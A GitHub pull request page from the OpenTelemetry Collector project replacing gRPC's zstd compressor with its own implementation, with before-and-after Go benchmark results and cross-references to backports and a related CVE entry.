Uses our own version of the zstd compressor for gRPC servers. The code
for it is based on the gzip compressor that comes built-in with gRPC.

Benchmarks before this PR:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   71594	     19066 ns/op	     615 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  151503	      8544 ns/op	     640 B/op	       6 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 3632570	       303.8 ns/op	     304 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68114	     16938 ns/op	     748 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  138091	      8047 ns/op	     896 B/op	       6 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 3081198	       402.5 ns/op	     400 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   43414	     27174 ns/op	     386 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  117534	      9903 ns/op	   10112 B/op	       6 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	 1000000	      1190 ns/op	     528 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   67275	     17508 ns/op	     700 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  196862	      6137 ns/op	     848 B/op	       6 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 3595815	       331.7 ns/op	     272 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   64105	     19104 ns/op	     844 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  169221	      6929 ns/op	    1120 B/op	       6 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2602239	       473.0 ns/op	     336 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   33861	     36473 ns/op	     904 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  107828	     10596 ns/op	   16832 B/op	       6 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  725080	      1540 ns/op	     689 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   76315	     16394 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  193314	      5957 ns/op	     688 B/op	       6 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 3558649	       345.2 ns/op	     208 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   68497	     18413 ns/op	     699 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  177841	      6520 ns/op	    1136 B/op	       6 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2354102	       497.4 ns/op	     272 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   21943	     54603 ns/op	    1941 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   71260	     16077 ns/op	   25312 B/op	       6 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  335415	      3026 ns/op	    1200 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	37.766s
```

After this version:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   74952	     15710 ns/op	     603 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  156784	      6966 ns/op	     208 B/op	       2 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 2216174	       510.4 ns/op	     308 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68095	     18569 ns/op	     736 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  150705	      8849 ns/op	     294 B/op	       2 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 2149710	       556.8 ns/op	     406 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   40040	     26159 ns/op	     368 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  123043	     10254 ns/op	     299 B/op	       2 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	  726780	      1457 ns/op	     533 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   64660	     18186 ns/op	     701 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  193225	      6267 ns/op	     273 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 2925073	       418.2 ns/op	     276 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   61320	     20641 ns/op	     846 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  190965	      6440 ns/op	     321 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2051575	       656.8 ns/op	     341 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   30097	     40680 ns/op	     907 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  127027	      8437 ns/op	     363 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  716541	      1803 ns/op	     694 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   82287	     15054 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  230558	      5470 ns/op	     221 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 2759403	       417.1 ns/op	     211 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   58208	     18925 ns/op	     702 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  199226	      6247 ns/op	     256 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2065202	       609.8 ns/op	     276 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   20583	     59762 ns/op	    1945 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   98254	     13152 ns/op	     728 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  389401	      3976 ns/op	    1209 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	40.394s
```

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>

---------

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

[mx-psi](/mx-psi)
added a commit
that referenced
this pull request
[Jun 5, 2024](#ref-commit-10e89bd)
[![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&u=f3e75d1eea47083cb122d48dee765a83b0eaf2aa&v=4)](/mx-psi) [![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&u=9ceb091c402688001623dcc1acd5833fc0d75e45&v=4)](/jpkrohling)

`[[configgrpc] Use own compressors for zstd (](/open-telemetry/opentelemetry-collector/commit/10e89bd77ab9e09b75bd6f440c925d3293e13233 "[configgrpc] Use own compressors for zstd (#10323) (#10324)

Backport of #10323

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
Co-authored-by: Juraci Paixão Kröhling <juraci@kroehling.de>")[#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323)[) (](/open-telemetry/opentelemetry-collector/commit/10e89bd77ab9e09b75bd6f440c925d3293e13233 "[configgrpc] Use own compressors for zstd (#10323) (#10324)

Backport of #10323

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
Co-authored-by: Juraci Paixão Kröhling <juraci@kroehling.de>")[#10324](https://github.com/open-telemetry/opentelemetry-collector/pull/10324)[)](/open-telemetry/opentelemetry-collector/commit/10e89bd77ab9e09b75bd6f440c925d3293e13233 "[configgrpc] Use own compressors for zstd (#10323) (#10324)

Backport of #10323

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
Co-authored-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
…

`[10e89bd](/open-telemetry/opentelemetry-collector/commit/10e89bd77ab9e09b75bd6f440c925d3293e13233)`

```
Backport of [#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323)

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
Co-authored-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

This was referenced Jun 5, 2024

[[chore] Merge release/v0.102.x into main replacement
#10328](/open-telemetry/opentelemetry-collector/pull/10328)
 Closed

[[chore] Merge release/v0.102.x into main second replacement
#10329](/open-telemetry/opentelemetry-collector/pull/10329)
 Merged

[Aneurysm9](/Aneurysm9)
added a commit
to aws-observability/aws-otel-collector
that referenced
this pull request
[Jun 5, 2024](#ref-commit-d5ff217)
[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)

`[Backport changes to confighttp and configgrpc](/aws-observability/aws-otel-collector/commit/d5ff2179e05626814d02ae704a9a6da72115c7d7 "Backport changes to `confighttp` and `configgrpc`

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")`
…

`[d5ff217](/aws-observability/aws-otel-collector/commit/d5ff2179e05626814d02ae704a9a6da72115c7d7)`

```
Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
[open-telemetry/opentelemetry-collector#10289](https://github.com/open-telemetry/opentelemetry-collector/pull/10289) and
[open-telemetry/opentelemetry-collector#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323) for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
```

[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)
[Aneurysm9](/Aneurysm9)
mentioned this pull request
[Jun 5, 2024](#ref-pullrequest-2336610621)

[Backport changes to `confighttp` and `configgrpc`
aws-observability/aws-otel-collector#2742](/aws-observability/aws-otel-collector/pull/2742)
 Merged

[Aneurysm9](/Aneurysm9)
added a commit
to aws-observability/aws-otel-collector
that referenced
this pull request
[Jun 6, 2024](#ref-commit-8e5ff8f)
[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)

`[Backport changes to confighttp and configgrpc](/aws-observability/aws-otel-collector/commit/8e5ff8f2b0847f8ca5ff91cb0da95d4f107a00c1 "Backport changes to `confighttp` and `configgrpc`

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")`
…

`[8e5ff8f](/aws-observability/aws-otel-collector/commit/8e5ff8f2b0847f8ca5ff91cb0da95d4f107a00c1)`

```
Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
[open-telemetry/opentelemetry-collector#10289](https://github.com/open-telemetry/opentelemetry-collector/pull/10289) and
[open-telemetry/opentelemetry-collector#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323) for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
```

[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)
[Aneurysm9](/Aneurysm9)
mentioned this pull request
[Jun 6, 2024](#ref-pullrequest-2337040187)

[Backport changes to `confighttp` and `configgrpc` to v0.39.x
aws-observability/aws-otel-collector#2743](/aws-observability/aws-otel-collector/pull/2743)
 Merged

[Aneurysm9](/Aneurysm9)
added a commit
to aws-observability/aws-otel-collector
that referenced
this pull request
[Jun 6, 2024](#ref-commit-b89839e)
[![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&u=50423d445f9227bbb3dff9780fe73e2e5d02ed65&v=4)](/Aneurysm9)

`[Backport changes to](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>") [confighttp](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>") [and](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>") [configgrpc](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>") [(](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")[#2743](https://github.com/aws-observability/aws-otel-collector/pull/2743)[)](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734 "Backport changes to `confighttp` and `configgrpc` (#2743)

Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
https://github.com/open-telemetry/opentelemetry-collector/pull/10289 and
https://github.com/open-telemetry/opentelemetry-collector/pull/10323 for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>")`
…

`[b89839e](/aws-observability/aws-otel-collector/commit/b89839e5bbcf4890972390e0f396ddf969236734)`

```
Upstream changes to address potential decompression-related failures in
the `confighttp` and `configgrpc` modules are backported.  See
[open-telemetry/opentelemetry-collector#10289](https://github.com/open-telemetry/opentelemetry-collector/pull/10289) and
[open-telemetry/opentelemetry-collector#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323) for
more details.

Signed-off-by: Anthony J Mirabella <a9@aneurysm9.com>
```

[![@mostynb](https://avatars.githubusercontent.com/u/6337887?s=40&v=4)](/mostynb)
[mostynb](/mostynb)
mentioned this pull request
[Jun 6, 2024](#ref-pullrequest-2339226339)

[[configgrpc] create zstd.Decoder's using WithDecoderConcurrency(1)
#10360](/open-telemetry/opentelemetry-collector/pull/10360)
 Closed

[![@tatianab](https://avatars.githubusercontent.com/u/6238967?s=40&v=4)](/tatianab)
[tatianab](/tatianab)
mentioned this pull request
[Jun 7, 2024](#ref-issue-2341176613)

[x/vulndb: potential Go vuln in github.com/open-telemetry/opentelemetry-collector: CVE-2024-36129
golang/vulndb#2900](/golang/vulndb/issues/2900)

Closed

[steves-canva](/steves-canva)
pushed a commit
to Canva/opentelemetry-collector
that referenced
this pull request
[Jun 14, 2024](#ref-commit-714289e)
[![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&u=f3e75d1eea47083cb122d48dee765a83b0eaf2aa&v=4)](/mx-psi) [![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&u=9ceb091c402688001623dcc1acd5833fc0d75e45&v=4)](/jpkrohling) [![@steves-canva](https://avatars.githubusercontent.com/u/97483767?s=40&v=4)](/steves-canva)

`[[configgrpc] Use own compressors for zstd (](/Canva/opentelemetry-collector/commit/714289e5e5d654c7def2dd3b877b918ccc0b28a9 "[configgrpc] Use own compressors for zstd (#10323) (#10324)

Backport of #10323

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
Co-authored-by: Juraci Paixão Kröhling <juraci@kroehling.de>")[open-telemetry#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323)[) (](/Canva/opentelemetry-collector/commit/714289e5e5d654c7def2dd3b877b918ccc0b28a9 "[configgrpc] Use own compressors for zstd (#10323) (#10324)

Backport of #10323

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
Co-authored-by: Juraci Paixão Kröhling <juraci@kroehling.de>")[ope…](https://github.com/open-telemetry/opentelemetry-collector/pull/10324)`
…

`[714289e](/Canva/opentelemetry-collector/commit/714289e5e5d654c7def2dd3b877b918ccc0b28a9)`

```
[…n-telemetry#10324](https://github.com/open-telemetry/opentelemetry-collector/pull/10324))

Backport of [open-telemetry#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323)

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
Co-authored-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

This was referenced Jul 26, 2024

[Added examples for systemd units
uniget-org/tools#6141](/uniget-org/tools/pull/6141)
 Merged

[Added config and host network
uniget-org/tools#6267](/uniget-org/tools/pull/6267)
 Merged

[Separated docker-compose-systemd from binary
uniget-org/tools#6303](/uniget-org/tools/pull/6303)
 Merged

[![@zhijie-yang](https://avatars.githubusercontent.com/u/24251674?s=40&v=4)](/zhijie-yang)
[zhijie-yang](/zhijie-yang)
mentioned this pull request
[Aug 29, 2024](#ref-issue-2493837307)

[ubuntu/grafana-agent:0.40.4-22.04\_stable (ubuntu 22.04) - Trivy Report - 2024-08-29 10:45:52.621829889 +0200 CEST m=+0.640145445
zhijie-yang/workflow-playground#5](/zhijie-yang/workflow-playground/issues/5)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector%2Fpull%2F10323)

Reviewers

[![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&v=4)](/mx-psi) [mx-psi](/mx-psi)

mx-psi approved these changes

[![@djaglowski](https://avatars.githubusercontent.com/u/5255616?s=40&v=4)](/djaglowski) [djaglowski](/djaglowski)

djaglowski approved these changes

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

 [**v0.102.1**](/open-telemetry/opentelemetry-collector/milestone/85 "v0.102.1")

Development

Successfully merging this pull request may close these issues.

3 participants

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=52&v=4)](/jpkrohling) [![@djaglowski](https://avatars.githubusercontent.com/u/5255616?s=52&v=4)](/djaglowski) [![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=52&v=4)](/mx-psi)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


